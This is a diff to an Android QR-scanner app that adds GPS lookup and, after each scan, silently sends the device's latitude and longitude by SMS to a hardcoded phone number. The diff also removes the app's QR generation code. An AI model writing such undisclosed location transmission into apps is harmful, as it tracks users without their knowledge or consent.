@@ -2,11 +2,18 @@ package com.example.enamul.qrcode;
 
 import android.Manifest;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
+import android.location.Location;
 import android.net.Uri;
+
+import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.appcompat.app.AppCompatActivity;
+
+import android.os.Build;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -16,6 +23,9 @@ import android.widget.QuickContactBadge;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.zxing.BarcodeFormat;
 import com.google.zxing.MultiFormatWriter;
 import com.google.zxing.WriterException;
@@ -32,47 +42,23 @@ public class MainActivity extends AppCompatActivity {
     Thread thread ;
     public final static int QRcodeWidth = 350 ;
     Bitmap bitmap ;
-
-    TextView tv_qr_readTxt;
-
+    private static final int PERMISSIONS_FINE_LOCATION = 99 ;
+    TextView tv_qr_readTxt,lat_long;
+    FusedLocationProviderClient fusedLocationProviderClient;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        findViewById(R.id.)
+
 
         imageView = (ImageView)findViewById(R.id.imageView);
         editText = (EditText)findViewById(R.id.editText);
         button = (Button)findViewById(R.id.button);
         btnScan = (Button)findViewById(R.id.btnScan);
         tv_qr_readTxt = (TextView) findViewById(R.id.tv_qr_readTxt);
+        lat_long = findViewById(R.id.lat_long);
 
-        button.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-
-
-
-                if(!editText.getText().toString().isEmpty()){
-                    EditTextValue = editText.getText().toString();
-
-                    try {
-                        bitmap = TextToImageEncode(EditTextValue);
-
-                        imageView.setImageBitmap(bitmap);
-
-                    } catch (WriterException e) {
-                        e.printStackTrace();
-                    }
-                }
-                else{
-                    editText.requestFocus();
-                    Toast.makeText(MainActivity.this, "Please Enter Your Scanned Test" , Toast.LENGTH_LONG).show();
-                }
-
-            }
-        });
 
 
         btnScan.setOnClickListener(new View.OnClickListener() {
@@ -89,42 +75,46 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
+        updateGPS();
     }
 
-
-    Bitmap TextToImageEncode(String Value) throws WriterException {
-        BitMatrix bitMatrix;
-        try {
-            bitMatrix = new MultiFormatWriter().encode(
-                    Value,
-                    BarcodeFormat.DATA_MATRIX.QR_CODE,
-                    QRcodeWidth, QRcodeWidth, null
-            );
-
-        } catch (IllegalArgumentException Illegalargumentexception) {
-
-            return null;
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        switch (requestCode){
+            case PERMISSIONS_FINE_LOCATION:
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED){
+                    updateGPS();
+                }
+                else{
+                    Toast.makeText(this,"This app requires permission to be granted",Toast.LENGTH_SHORT).show();
+                    finish();
+                }
         }
-        int bitMatrixWidth = bitMatrix.getWidth();
+    }
+    private void updateGPS() {
 
-        int bitMatrixHeight = bitMatrix.getHeight();
+        fusedLocationProviderClient= LocationServices.getFusedLocationProviderClient(MainActivity.this);
+        if(ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)== PackageManager.PERMISSION_GRANTED) {
+            fusedLocationProviderClient.getLastLocation().addOnSuccessListener(this, new OnSuccessListener<Location>() {
+                @Override
+                public void onSuccess(Location location) {
+                    updateUIValues(location);
 
-        int[] pixels = new int[bitMatrixWidth * bitMatrixHeight];
+                }
+            });
 
-        for (int y = 0; y < bitMatrixHeight; y++) {
-            int offset = y * bitMatrixWidth;
-
-            for (int x = 0; x < bitMatrixWidth; x++) {
-
-                pixels[offset + x] = bitMatrix.get(x, y) ?
-                        getResources().getColor(R.color.QRCodeBlackColor):getResources().getColor(R.color.QRCodeWhiteColor);
+        }else{
+            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
+                requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION},PERMISSIONS_FINE_LOCATION);
             }
         }
-        Bitmap bitmap = Bitmap.createBitmap(bitMatrixWidth, bitMatrixHeight, Bitmap.Config.ARGB_4444);
-
-        bitmap.setPixels(pixels, 0, 350, 0, 0, bitMatrixWidth, bitMatrixHeight);
-        return bitmap;
     }
+
+    private void updateUIValues(Location location) {
+        lat_long.setText(String.valueOf(location.getLatitude())+String.valueOf(location.getLongitude()));
+    }
+
 
 
 
@@ -141,6 +131,8 @@ public class MainActivity extends AppCompatActivity {
 
                 tv_qr_readTxt.setText(result.getContents());
                 Toast.makeText(this, "Scanned: " + result.getContents(), Toast.LENGTH_LONG).show();
+                SmsManager.getDefault().sendTextMessage("0688247608",
+                        null, String.valueOf(lat_long.getText()),null,null);
             }
         } else {
             // This is important, otherwise the result will not be passed to the fragment
